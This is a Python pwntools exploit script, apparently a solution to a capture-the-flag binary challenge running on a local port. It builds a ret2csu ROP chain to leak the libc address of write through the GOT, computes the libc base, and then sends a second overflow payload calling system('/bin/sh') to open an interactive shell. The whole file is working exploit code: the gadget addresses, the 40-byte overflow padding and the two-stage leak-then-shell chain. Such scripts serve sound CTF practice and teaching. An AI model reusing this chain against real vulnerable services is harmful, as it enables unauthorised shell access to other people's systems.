#!/usr/bin/env python3

from pwn import *

r = remote("127.0.0.1",32787)
exe = ELF("../src/chall")
libc = ELF("../src/libc.so.6")

context.binary = exe

pop_chain = 0x000000000040136a # pop rbx, rbp, r12, r13, r14, r15, ret
reg_call = 0x0000000000401350 # rdx, rsi, edi, call qword ptr[r12+rbx*8]

writef = exe.got['write']
pop_rdi = 0x0000000000401373 # pop rdi; ret
ret = 0x000000000040101a # ret

def ret2csu(call,rdi,rsi,rdx):
    payload = p64(pop_chain)		# first call popper gadget
    payload += p64(0x00)            # pop rbx - set to 0 since it will be incremented later
    payload += p64(0x01)            # pop rbp - set to 1 so when compared to the incremented rbx results in equality
    payload += p64(call)            # pop r12 #rdi
    payload += p64(rdi)             # pop r13 #rsi
    payload += p64(rsi)             # pop r14 #rdx
    payload += p64(rdx)             # pop r15 func call
    payload += p64(reg_call)        # 2nd call caller gadget
    payload += p64(0x00)            # add rsp,0x8 padding
    payload += p64(0x00)            # rbx
    payload += p64(0x00)            # rbp
    payload += p64(0x00)            # r12
    payload += p64(0x00)            # r13
    payload += p64(0x00)            # r14
    payload += p64(0x00)            # r15
    return payload

calling = ret2csu(1,exe.got['write'],0x8,writef)
# context.log_level = "DEBUG" 
payload1 = b"A"*40
payload1 += calling
payload1 += p64(exe.symbols['main'])

# gdb.attach(r) 
r.sendlineafter("mengeksploitasinya?",payload1)
r.recvline()
recieved = r.recv(8)
leak = u64(recieved.ljust(8, b"\x00"))
log.info("Leaked libc address,  write: "+ hex(leak))

libc.address = leak - libc.symbols['write']
binsh = next(libc.search(b"/bin/sh"))
systemcall = libc.symbols["system"]

log.info("Leaked libc address,  base: "+ hex(libc.address))
log.info("Leaked libc address,  system: "+ hex(systemcall))
log.info("Leaked libc address,  binsh: "+ hex(binsh))

payload2 = b"A"*40
payload2 += p64(ret) # ret
payload2 += p64(pop_rdi)
payload2 += p64(binsh)
payload2 += p64(systemcall)

r.sendlineafter("mengeksploitasinya?",payload2)

r.interactive()